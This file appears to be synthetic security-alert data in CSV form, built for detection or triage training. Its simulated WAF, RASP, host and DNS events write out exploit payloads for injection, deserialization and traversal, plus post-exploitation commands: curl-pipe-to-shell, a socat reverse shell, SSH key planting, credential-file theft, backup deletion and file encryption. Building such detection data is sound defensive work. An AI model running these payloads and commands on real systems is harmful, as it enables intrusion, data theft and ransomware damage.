+SIM-1058-1,SIM-B-1058,,,2026-06-26 09:54:23,waf,WAF0375895,/api/v1/backup/download file=../../../../etc/app/config.yml&mode=raw Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+SIM-1058-2,SIM-B-1058,,,2026-06-26 09:55:51,hids,HID0407361,cat /etc/app/cfg.yml /bin/cat cat /etc/app/cfg.yml <== /bin/sh -c 'cat /etc/app/cfg.yml' <== /opt/app/backupd
+SIM-1059-1,SIM-B-1059,,,2026-06-10 18:20:21,waf,WAF0267606,/api/upload/avatar filename=.htaccess&content=AddType application%2fx-httpd-php+png Mozilla/5.0 (Linux; Androi
+SIM-1059-2,SIM-B-1059,,,2026-06-10 18:21:19,hids,HID0290010,curl -s http://10.20.7.31/px.sh | sh /bin/sh sh -c curl -s http://10.20.7.31/px.sh <== apache2
+SIM-1060-1,SIM-B-1060,,,2026-06-04 20:07:07,waf,WAF0226599,/api/v1/fetch/image url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Mozilla/5.0 (Linux; 
+SIM-1060-2,SIM-B-1060,,,2026-06-04 20:09:05,hids,HID0245577,curl -s http://10.20.8.5:8500/v1/kv/?recurse /usr/bin/curl curl <== java -jar /opt/app/fetcher.jar
+SIM-1061-1,SIM-B-1061,SIM-INC-1061,CASE-004,2026-06-09 10:48:29,waf,WAF0258515,"/index.php _ignition/execute-solution {""viewFile"":""phar:///tmp/7be2.phar""} Mozilla/5.0 (Windows NT 10.0; Win64"
+SIM-1061-2,SIM-B-1061,SIM-INC-1061,CASE-004,2026-06-09 10:48:30,web,WEB0260197,"/index.php _ignition/execute-solution {""viewFile"":""phar:///tmp/7be2.phar""} Mozilla/5.0 (Windows NT 10.0; Win64"
+SIM-1061-3,SIM-B-1061,SIM-INC-1061,CASE-004,2026-06-09 10:48:32,rasp,RASP0286011,"https://app-php-31.ops-corp.com/index.php {""viewFile"": ""phar:///tmp/7be2.phar"", ""solution"": ""execute-solution"""
+SIM-1061-4,SIM-B-1061,SIM-INC-1061,CASE-004,2026-06-09 10:49:30,hids,HID0280158,id /bin/id id <== /bin/sh -c 'id' <== php-fpm: pool www
+SIM-1061-5,SIM-B-1061,SIM-INC-1061,CASE-004,2026-06-09 10:50:15,hids,HID0280162,"echo ""* * * * * curl -s http://10.20.5.19/x|sh"" >> /var/spool/cron/root echo echo ""* * * * * curl <== /usr/sbi"
+SIM-1062-1,SIM-B-1062,,,2026-06-23 16:15:01,waf,WAF0356964,/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (
+SIM-1062-2,SIM-B-1062,,,2026-06-23 16:15:03,web,WEB0359287,/api/v2/order/submit @type=com.sun.rowset.JdbcRowSetImpl&dataSourceName=ldap://10.20.7.31:1389/e Mozilla/5.0 (
+SIM-1062-3,SIM-B-1062,,,2026-06-23 16:15:04,rasp,RASP0394945,"https://app-java-179.ops-corp.com/api/v2/order/submit {""autoType"": ""JdbcRowSetImpl"", ""jndi"": ""ldap://10.20.7.3"
+SIM-1062-4,SIM-B-1062,,,2026-06-23 16:16:36,hids,HID0386847,id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/app/order-service.jar
+SIM-1062-5,SIM-B-1062,,,2026-06-23 16:17:36,hids,HID0386852,sudo -l; sudo su - sudo sudo -l; sudo su - <== /bin/bash -c 'sudo -l; sudo su -' <== java -jar /opt/app/o
+SIM-1063-1,SIM-B-1063,,,2026-06-15 16:32:41,waf,WAF0301689,"/solr/admin/cores ?wt=json&action=CREATE&config={""params.resource.loader.enabled"":true} Mozilla/5.0 (X11; Linu"
+SIM-1063-2,SIM-B-1063,,,2026-06-15 16:32:42,web,WEB0303652,"/solr/admin/cores ?wt=json&action=CREATE&config={""params.resource.loader.enabled"":true} Mozilla/5.0 (X11; Linu"
+SIM-1063-3,SIM-B-1063,,,2026-06-15 16:32:43,rasp,RASP0333783,"https://app-java-74.ops-corp.com/solr/admin/cores {""template"": ""velocity"", ""loader"": ""params.resource""} Mozill"
+SIM-1063-4,SIM-B-1063,,,2026-06-15 16:34:08,hids,HID0326947,uname -a /bin/uname uname -a <== /bin/bash -c 'uname -a' <== java -jar /opt/solr/start.jar
+SIM-1063-5,SIM-B-1063,,,2026-06-15 16:34:45,hids,HID0326950,cd /tmp && ./pkexec_root --user root /bin/sh -c 'id' pkexec ./pkexec_root uid=0(root) <== polkitd
+SIM-1064-1,SIM-B-1064,,,2026-06-08 05:34:50,waf,WAF0250088,/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin
+SIM-1064-2,SIM-B-1064,,,2026-06-08 05:34:52,web,WEB0251715,/pages/createpage-entervariables.action queryString=%2F%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toStrin
+SIM-1064-3,SIM-B-1064,,,2026-06-08 05:34:54,rasp,RASP0276686,"https://app-tomcat-58.ops-corp.com/pages/createpage-entervariables.action {""ognl"": ""createpage-entervariables"""
+SIM-1064-4,SIM-B-1064,,,2026-06-08 05:35:56,hids,HID0271026,id /bin/id id <== /bin/dash -c 'id' <== java -jar /opt/atlassian/confluence/confluence.jar
+SIM-1064-5,SIM-B-1064,,,2026-06-08 05:36:48,hids,HID0271030,curl -s http://10.20.5.77/b/x -o /dev/shm/.a;chmod +x /dev/shm/.a curl curl -s http://10.20.5.77/b/x -o <== /u
+SIM-1065-1,SIM-B-1065,,,2026-06-30 09:48:56,waf,WAF0403549,"/actuator/gateway/routes/x1 {""value"":""#{T(java.lang.Runtime).getRuntime().exec('id')}""} Mozilla/5.0 (Macintosh"
+SIM-1065-2,SIM-B-1065,,,2026-06-30 09:48:57,web,WEB0406174,"/actuator/gateway/routes/x1 {""value"":""#{T(java.lang.Runtime).getRuntime().exec('id')}""} Mozilla/5.0 (Macintosh"
+SIM-1065-3,SIM-B-1065,,,2026-06-30 09:48:59,rasp,RASP0446491,"https://app-spring-23.ops-corp.com/actuator/gateway/routes/x1 {""spel"": ""T(java.lang.Runtime).getRuntime().exec"
+SIM-1065-4,SIM-B-1065,,,2026-06-30 09:50:25,hids,HID0437329,whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\app\gateway.jar
+SIM-1065-5,SIM-B-1065,,,2026-06-30 09:52:01,hids,HID0437338,"sqlcmd -S 10.20.4.31 -Q ""EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"" sqlcmd sqlcmd -S 10.20.4.31 <== /usr/s"
+SIM-1066-1,SIM-B-1066,,,2026-06-24 08:19:49,waf,WAF0361600,"/api/v1/report/preview {""code"":""process.binding('spawn_sync').spawn({args:['-c','id']})""} Mozilla/5.0 (Linux; "
+SIM-1066-2,SIM-B-1066,,,2026-06-24 08:19:51,web,WEB0363953,"/api/v1/report/preview {""code"":""process.binding('spawn_sync').spawn({args:['-c','id']})""} Mozilla/5.0 (Linux; "
+SIM-1066-3,SIM-B-1066,,,2026-06-24 08:19:52,rasp,RASP0400075,"https://app-node-140.ops-corp.com/api/v1/report/preview {""sandbox_escape"": ""spawn_sync"", ""runtime"": ""vm2""} Moz"
+SIM-1066-4,SIM-B-1066,,,2026-06-24 08:21:49,hids,HID0391874,id /bin/id id <== /bin/dash -c 'id' <== /usr/bin/node /opt/app/preview-worker.js
+SIM-1066-5,SIM-B-1066,,,2026-06-24 08:22:23,hids,HID0391877,"socat TCP:10.20.5.19:8443 EXEC:/bin/bash,pty,setsid,sigint,sane socat socat TCP:10.20.5.19 <== /usr/sbin/sshd "
+SIM-1067-1,SIM-B-1067,,,2026-06-26 22:45:21,waf,WAF0379600,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS 
+SIM-1067-2,SIM-B-1067,,,2026-06-26 22:45:22,web,WEB0382070,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php <?php system('id'); ?> Mozilla/5.0 (iPhone; CPU iPhone OS 
+SIM-1067-3,SIM-B-1067,,,2026-06-26 22:45:23,rasp,RASP0419992,"https://app-php-46.ops-corp.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php {""eval_stdin"": ""system"", ""a"
+SIM-1067-4,SIM-B-1067,,,2026-06-26 22:46:25,hids,HID0411374,ps aux /bin/ps ps aux <== /bin/sh -c 'ps aux' <== php-fpm: pool www
+SIM-1067-5,SIM-B-1067,,,2026-06-26 22:47:39,hids,HID0411381,"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7kQd9Zc root@k"" >> /root/.ssh/authorized_keys echo echo <== /usr/"
+SIM-1068-1,SIM-B-1068,,,2026-06-22 02:59:44,waf,WAF0346222,/cli remoting=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmD+AA Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.3
+SIM-1068-2,SIM-B-1068,,,2026-06-22 02:59:46,web,WEB0348475,/cli remoting=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmD+AA Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.3
+SIM-1068-3,SIM-B-1068,,,2026-06-22 02:59:48,rasp,RASP0383060,"https://app-java-17.ops-corp.com/cli {""deserialization"": ""rO0ABXNyABFqYXZhLnV0aWw="", ""cli"": ""remoting""} Mozill"
+SIM-1068-4,SIM-B-1068,,,2026-06-22 03:01:15,hids,HID0375206,id /bin/id id <== /bin/dash -c 'id' <== /usr/bin/java -jar /usr/share/jenkins/jenkins.war
+SIM-1068-5,SIM-B-1068,,,2026-06-22 03:01:59,hids,HID0375210,docker -H unix:///var/run/docker.sock exec -u 0 web /bin/sh -c 'id' docker docker -H unix:///var <== /usr/sbin
+SIM-1069-1,SIM-B-1069,,,2026-06-24 10:11:43,waf,WAF0362138,"/apisix/admin/routes/r1 {""uri"":""/*"",""plugins"":{""serverless-pre-function"":{""phase"":""access""}}} Mozilla/5.0 (Win"
+SIM-1069-2,SIM-B-1069,,,2026-06-24 10:11:44,web,WEB0364494,"/apisix/admin/routes/r1 {""uri"":""/*"",""plugins"":{""serverless-pre-function"":{""phase"":""access""}}} Mozilla/5.0 (Win"
+SIM-1069-3,SIM-B-1069,,,2026-06-24 10:11:46,rasp,RASP0400670,"https://app-nginx-88.ops-corp.com/apisix/admin/routes/r1 {""lua"": ""serverless-pre-function"", ""bypass"": ""X-REAL-"
+SIM-1069-4,SIM-B-1069,,,2026-06-24 10:13:47,hids,HID0392457,id /bin/id id <== /bin/dash -c 'id' <== openresty: worker process
+SIM-1069-5,SIM-B-1069,,,2026-06-24 10:14:50,hids,HID0392462,cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/.t cat cat /var/run/secrets/kubernet <== /usr/s
+SIM-1070-1,SIM-B-1070,,,2026-06-08 07:45:58,waf,WAF0250718,/uploads/user filename=1.djvu&file=%41%54%26%54%46%4f%52%4d%00DjVu Mozilla/5.0 (Linux; Android 13; SM-S918B) A
+SIM-1070-2,SIM-B-1070,,,2026-06-08 07:46:00,web,WEB0252349,/uploads/user filename=1.djvu&file=%41%54%26%54%46%4f%52%4d%00DjVu Mozilla/5.0 (Linux; Android 13; SM-S918B) A
+SIM-1070-3,SIM-B-1070,,,2026-06-08 07:46:01,rasp,RASP0277383,"https://app-rails-63.ops-corp.com/uploads/user {""exiftool"": ""DjVu"", ""rce"": ""Image::ExifTool""} Mozilla/5.0 (Lin"
+SIM-1070-4,SIM-B-1070,,,2026-06-08 07:46:57,hids,HID0271708,id /bin/id id <== /bin/bash -c 'id' <== bundle exec puma -C /opt/gitlab/config/puma.rb
+SIM-1070-5,SIM-B-1070,,,2026-06-08 07:48:47,hids,HID0271718,cat /etc/shadow | base64 -w0 | split -b 512 - /tmp/.s cat cat /etc/shadow | base64 -w0 | split <== /usr/sbin/s
+SIM-1071-1,SIM-B-1071,,,2026-06-20 02:02:38,waf,WAF0332108,/_fragment _path=_fragment&_controller=system&code=id&_format=html Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1
+SIM-1071-2,SIM-B-1071,,,2026-06-20 02:02:39,web,WEB0334269,/_fragment _path=_fragment&_controller=system&code=id&_format=html Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1
+SIM-1071-3,SIM-B-1071,,,2026-06-20 02:02:40,rasp,RASP0367442,"https://app-php-105.ops-corp.com/_fragment {""template"": ""twig"", ""controller"": ""system"", ""cmd"": ""id""} Mozilla/5"
+SIM-1071-4,SIM-B-1071,,,2026-06-20 02:04:08,hids,HID0359911,cat /etc/hostname /usr/bin/cat cat /etc/hostname <== /bin/dash -c 'cat /etc/hostname' <== php-fpm: pool w
+SIM-1071-5,SIM-B-1071,,,2026-06-20 02:04:47,hids,HID0359914,systemctl enable --now kzd.service systemctl systemctl enable --now kzd.service <== /bin/sh -c 'sys
+SIM-1072-1,SIM-B-1072,,,2026-06-12 13:05:03,waf,WAF0279931,/password_change.cgi ?expired=id%7C&old=bad&new1=x&new2=x Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS 
+SIM-1072-2,SIM-B-1072,,,2026-06-12 13:05:05,web,WEB0281753,/password_change.cgi ?expired=id%7C&old=bad&new1=x&new2=x Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS 
+SIM-1072-3,SIM-B-1072,,,2026-06-12 13:05:07,rasp,RASP0309708,"https://app-webmin-52.ops-corp.com/password_change.cgi {""webmin"": ""password_change"", ""cmd"": ""id|""} Mozilla/5.0"
+SIM-1072-4,SIM-B-1072,,,2026-06-12 13:06:35,hids,HID0303369,id /bin/id id <== /bin/dash -c 'id' <== /usr/share/webmin/miniserv.pl
+SIM-1072-5,SIM-B-1072,,,2026-06-12 13:07:33,hids,HID0303374,"ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.8.41 ""uname -a; id"" ssh ssh -i /tmp/.key -o St <== /us"
+SIM-1073-1,SIM-B-1073,,,2026-06-16 01:18:34,waf,WAF0304216,/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct
+SIM-1073-2,SIM-B-1073,,,2026-06-16 01:18:35,web,WEB0306196,/api/v3/export class.module.classLoader.resources.context.parent.pipeline.first.prefix=evil&suffix=.jsp&direct
+SIM-1073-3,SIM-B-1073,,,2026-06-16 01:18:37,rasp,RASP0336580,"https://app-spring-141.ops-corp.com/api/v3/export {""spring4shell"": ""pipeline.first.prefix"", ""dir"": ""webapps/RO"
+SIM-1073-4,SIM-B-1073,,,2026-06-16 01:19:39,hids,HID0329683,whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\app\export.jar
+SIM-1073-5,SIM-B-1073,,,2026-06-16 01:21:03,hids,HID0329691,"wmic /node:10.20.10.62 process call create ""cmd.exe /c whoami"" cmd.exe cmd.exe /c wmic /node:10.20.10.62 <== s"
+SIM-1074-1,SIM-B-1074,,,2026-06-14 22:59:04,waf,WAF0296626,/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1
+SIM-1074-2,SIM-B-1074,,,2026-06-14 22:59:06,web,WEB0298556,/manager/deploy?path=/svc&update=true PK%03%04%14%00%08%00WEB-INF/web.xml META-INF/MANIFEST.MF Mozilla/5.0 (X1
+SIM-1074-3,SIM-B-1074,,,2026-06-14 22:59:07,rasp,RASP0328181,"https://app-tomcat-171.ops-corp.com/manager/deploy?path=/svc&update=true {""war_deploy"": ""manager/deploy"", ""arc"
+SIM-1074-4,SIM-B-1074,,,2026-06-14 23:00:33,hids,HID0321460,cmd.exe /c ipconfig /all cmd.exe cmd.exe /c ipconfig /all <== services.exe <== wininit.exe
+SIM-1074-5,SIM-B-1074,,,2026-06-14 23:01:04,hids,HID0321463,cmd.exe /c net user /add svc_backup Xr7#pqZ2! cmd.exe cmd.exe /c net user /add svc_backup Xr7#pqZ2! <== servic
+SIM-1075-1,SIM-B-1075,,,2026-06-01 16:18:11,waf,WAF0204739,/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
+SIM-1075-2,SIM-B-1075,,,2026-06-01 16:18:12,web,WEB0206072,/webtools/control/ProgramExport groovyProgram=Thread.start{ 'whoami'.execute() } Mozilla/5.0 (Windows NT 10.0;
+SIM-1075-3,SIM-B-1075,,,2026-06-01 16:18:13,rasp,RASP0226508,"https://app-java-37.ops-corp.com/webtools/control/ProgramExport {""groovy"": ""Thread.start"", ""auth_bypass"": ""Pro"
+SIM-1075-4,SIM-B-1075,,,2026-06-01 16:19:12,hids,HID0221883,whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== java.exe -jar C:\ofbiz\ofbiz.jar
+SIM-1075-5,SIM-B-1075,,,2026-06-01 16:21:12,hids,HID0221893,reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f reg.exe reg.exe add HKCU <== serv
+SIM-1076-1,SIM-B-1076,,,2026-06-03 00:11:13,waf,WAF0213932,/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
+SIM-1076-2,SIM-B-1076,,,2026-06-03 00:11:15,web,WEB0215325,/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil
+SIM-1076-3,SIM-B-1076,,,2026-06-03 00:11:17,rasp,RASP0236680,"https://app-node-126.ops-corp.com/api/render {""ejs"": ""outputFunctionName"", ""exec"": ""obfuscated-require""} Mozil"
+SIM-1076-4,SIM-B-1076,,,2026-06-03 00:13:15,hids,HID0231851,whoami C:\Windows\System32\whoami.exe whoami <== cmd.exe /c whoami <== node.exe C:\app\server.js
+SIM-1076-5,SIM-B-1076,,,2026-06-03 00:14:22,hids,HID0231856,"schtasks /create /tn Updater /tr ""powershell -c IEX(iwr 10.20.5.19/a)"" /sc minute /mo 5 schtasks schtasks <== "
+SIM-1077-1,SIM-B-1077,,,2026-06-29 03:09:03,waf,WAF0394707,/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;
+SIM-1077-2,SIM-B-1077,,,2026-06-29 03:09:04,web,WEB0397275,/user/register element_parents=account/mail/%23value&_wrapper_format=drupal_ajax Mozilla/5.0 (Windows NT 10.0;
+SIM-1077-3,SIM-B-1077,,,2026-06-29 03:09:06,rasp,RASP0436708,"https://app-php-198.ops-corp.com/user/register {""drupalgeddon2"": ""element_parents"", ""cmd"": ""id""} Mozilla/5.0 ("
+SIM-1077-4,SIM-B-1077,,,2026-06-29 03:11:03,hids,HID0427750,id /usr/bin/id id <== /bin/bash -c 'id' <== /usr/sbin/apache2 -k start
+SIM-1077-5,SIM-B-1077,,,2026-06-29 03:11:51,hids,HID0427755,rm -f /var/log/apache2/access.log /tmp/.i* && history -c rm rm -f /var/log/apache2/access.log /tmp/.i* <== /us
+SIM-1078-1,SIM-B-1078,,,2026-06-16 09:31:38,waf,WAF0306586,/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+SIM-1078-2,SIM-B-1078,,,2026-06-16 09:31:40,web,WEB0308581,/api/v1/reports/export filter=1);COPY (SELECT '') TO PROGRAM 'id';-- Mozilla/5.0 (Linux; Android 14; Pixel 8) 
+SIM-1078-3,SIM-B-1078,,,2026-06-16 09:31:41,rasp,RASP0339201,"https://app-django-84.ops-corp.com/api/v1/reports/export {""sqli"": ""COPY TO PROGRAM"", ""orm"": ""RawSQL""} Mozilla/"
+SIM-1078-4,SIM-B-1078,,,2026-06-16 09:33:10,hids,HID0332253,id /bin/id id <== /bin/bash -c 'id' <== /opt/app/venv/bin/python manage.py runserver
+SIM-1078-5,SIM-B-1078,,,2026-06-16 09:34:40,hids,HID0332261,"nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 nmap nmap -sT -Pn -p 22,445,3389 --open 10.20.6.0/24 <== /usr/"
+SIM-1079-1,SIM-B-1079,,,2026-06-12 04:39:25,waf,WAF0277501,/phpmyadmin/index.php target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_5a Mozilla/5.0 (Windows NT 11
+SIM-1079-2,SIM-B-1079,,,2026-06-12 04:39:26,web,WEB0279307,/phpmyadmin/index.php target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_5a Mozilla/5.0 (Windows NT 11
+SIM-1079-3,SIM-B-1079,,,2026-06-12 04:39:27,rasp,RASP0307019,"https://app-php-153.ops-corp.com/phpmyadmin/index.php {""path_traversal"": ""db_sql.php%3f"", ""session"": ""sess_5a"""
+SIM-1079-4,SIM-B-1079,,,2026-06-12 04:41:26,hids,HID0300738,cmd.exe /c systeminfo cmd.exe cmd.exe /c systeminfo <== services.exe <== wininit.exe
+SIM-1079-5,SIM-B-1079,,,2026-06-12 04:42:08,hids,HID0300742,powershell -c Add-MpPreference -ExclusionPath C:\Users\Public powershell.exe powershell -c Add-MpPref <== serv
+SIM-1080-1,SIM-B-1080,,,2026-06-27 20:06:06,waf,WAF0385754,"/druid/indexer/v1/sampler {""function"":""function(){java.lang.Runtime.getRuntime().exec('id')}""} Mozilla/5.0 (Ma"
+SIM-1080-2,SIM-B-1080,,,2026-06-27 20:06:08,web,WEB0388264,"/druid/indexer/v1/sampler {""function"":""function(){java.lang.Runtime.getRuntime().exec('id')}""} Mozilla/5.0 (Ma"
+SIM-1080-3,SIM-B-1080,,,2026-06-27 20:06:10,rasp,RASP0426802,"https://app-java-153.ops-corp.com/druid/indexer/v1/sampler {""javascript"": ""ProcessBuilder"", ""query"": ""sampler"""
+SIM-1080-4,SIM-B-1080,,,2026-06-27 20:07:07,hids,HID0418044,id /usr/bin/id id <== /bin/sh -c 'id' <== java -server -jar /opt/druid/lib/druid.jar
+SIM-1080-5,SIM-B-1080,,,2026-06-27 20:08:23,hids,HID0418050,tar czf /tmp/.cache/a.tgz /etc /var/lib/mysql /home tar tar czf /tmp/.cache/a.tgz /etc /var/lib/mysq <== /usr/
+SIM-1081-1,SIM-B-1081,SIM-INC-1081,CASE-005,2026-07-13 15:32:46,rasp,RASP0543334,"https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {""upload"": ""upd.php"", ""cmd"": ""vssadmin d"
+SIM-1081-2,SIM-B-1081,SIM-INC-1081,CASE-005,2026-07-13 15:34:14,hids,HID0532191,cipher /e /s:C:\inetpub\data cipher.exe cipher.exe /e /s:C:\inetpub\data <== php-cgi.exe
+SIM-1081-3,SIM-B-1081,SIM-INC-1081,CASE-005,2026-07-13 15:38:34,hids,HID0532213,vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe
+SIM-1082-1,SIM-B-1082,,,2026-07-30 17:58:28,hids,HID0660425,net use \\10.20.3.61\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <
+SIM-1082-2,SIM-B-1082,,,2026-07-30 18:01:13,hids,HID0660439,cipher /e /s:C:\files\2026q2 cipher.exe cipher.exe /e /s:C:\files\2026q2 <== cmd.exe /c cipher.exe
+SIM-1083-1,SIM-B-1083,,,2026-07-27 10:02:01,hids,HID0635447,mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\db && curl -T C:\db\.k 10.20.5.19 cmd.
+SIM-1083-2,SIM-B-1083,,,2026-07-27 12:38:01,dns,DNS0619200,265662bc.tafmez-4b19.net A 192.0.2.128
+SIM-1083-3,SIM-B-1083,,,2026-07-27 12:38:41,dns,DNS0619204,93624ea4.tafmez-4b19.net A 10.10.24.146
+SIM-1083-4,SIM-B-1083,,,2026-07-27 12:40:41,dns,DNS0619214,c29e4024.tafmez-4b19.net A 10.10.35.69
+SIM-1084-1,SIM-B-1084,,,2026-07-12 14:11:38,hids,HID0524261,"schtasks /create /tn OpsSync /tr ""cmd.exe /c C:\ProgramData\ops.bat"" /sc daily /ru SYSTEM <== cmd.exe /c schta"
+SIM-1084-2,SIM-B-1084,,,2026-07-12 14:12:18,hids,HID0524265,vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c 
+SIM-1084-3,SIM-B-1084,,,2026-07-12 14:19:18,hids,HID0524301,openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\share\2026Q2.xlsx -out C:\share\2026Q2.xlsx.lock <== cmd.exe /c 
+SIM-1085-1,SIM-B-1085,,,2026-07-09 02:34:37,hids,HID0498135,wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <==
+SIM-1085-2,SIM-B-1085,,,2026-07-09 02:36:47,hids,HID0498146,"powershell -c ""$a=[Security.Cryptography.Aes]::Create();gci C:\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr"
+SIM-1086-1,SIM-B-1086,,,2026-07-07 09:24:51,hids,HID0485273,net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <==
+SIM-1086-2,SIM-B-1086,,,2026-07-07 09:25:16,hids,HID0485275,vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe
+SIM-1086-3,SIM-B-1086,,,2026-07-07 09:26:51,hids,HID0485283,openssl enc -aes-256-cbc -in C:\SQL\DATA\orders.mdf -out C:\SQL\DATA\orders.mdf.lock <== cmd.exe /c openssl <=
+SIM-1087-1,SIM-B-1087,,,2026-07-25 03:37:40,hids,HID0618447,net use Z: \\10.20.4.88\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s
+SIM-1087-2,SIM-B-1087,,,2026-07-25 03:40:05,hids,HID0618460,for /r Z:\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /
+SIM-1088-1,SIM-B-1088,,,2026-07-10 10:10:15,rasp,RASP0518648,"https://app-node-33.ops-corp.com/api/v1/files/bulk {""upload"": ""README_RESTORE.txt"", ""cmd"": ""gpg -c -o /srv.tgz"
+SIM-1088-2,SIM-B-1088,,,2026-07-10 10:12:13,hids,HID0508017,rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r
+SIM-1089-1,SIM-B-1089,,,2026-07-29 06:10:53,hids,HID0649241,net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\k.dat --yes C
+SIM-1090-1,SIM-B-1090,,,2026-07-21 08:26:38,hids,HID0589956,"wmic /node:10.20.8.14 process call create ""cmd.exe /c copy \\10.20.3.9\pub\l.exe C:\p.exe"" <== cmd.exe /c wmic"
+SIM-1090-2,SIM-B-1090,,,2026-07-21 08:28:03,hids,HID0589963,"wmic /node:10.20.8.14 process call create ""cmd.exe /c C:\p.exe -s C:\share"" <== cmd.exe /c wmic <== services.e"
+SIM-1090-3,SIM-B-1090,,,2026-07-21 08:31:38,hids,HID0589982,cipher /e /s:C:\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\share <== cmd.exe /c cip
+SIM-1091-1,SIM-B-1091,,,2026-07-25 09:12:35,hids,HID0620191,openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -
+SIM-1091-2,SIM-B-1091,,,2026-07-25 09:16:55,hids,HID0620214,rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash
+SIM-1092-1,SIM-B-1092,,,2026-07-13 00:35:20,hids,HID0527510,"ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 ""rm -rf /backup/*"" <== /bin/bash -c 'ssh' <== /u"
+SIM-1092-2,SIM-B-1092,,,2026-07-13 00:36:30,hids,HID0527516,tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u
+SIM-1092-3,SIM-B-1092,,,2026-07-13 03:48:30,dns,DNS0512535,c0565abc.qovzmi-9c31.net A 192.0.2.51
+SIM-1092-4,SIM-B-1092,,,2026-07-13 03:49:30,dns,DNS0512540,76ecadab.qovzmi-9c31.net A 10.10.25.77
+SIM-1092-5,SIM-B-1092,,,2026-07-13 03:51:00,dns,DNS0512547,d1004d20.qovzmi-9c31.net A 10.10.27.49
+SIM-1093-1,SIM-B-1093,,,2026-07-07 22:16:34,hids,HID0489292,systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste
+SIM-1093-2,SIM-B-1093,,,2026-07-07 22:18:34,hids,HID0489302,"find /var/lib/mysql -name ""ib*.ibd"" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \; <== /bin/bash -c 'fin"
+SIM-1093-3,SIM-B-1093,,,2026-07-07 22:22:34,hids,HID0489323,"printf ""data renamed to .enc"" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb"
+SIM-1094-1,SIM-B-1094,,,2026-07-07 17:17:03,hids,HID0487732,virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <=
+SIM-1094-2,SIM-B-1094,,,2026-07-07 17:20:03,hids,HID0487748,"find /vmstore -name ""*.vmdk"" -exec gpg -c --batch --passphrase-file /tmp/.k {} \; find find /vmstore -name <=="
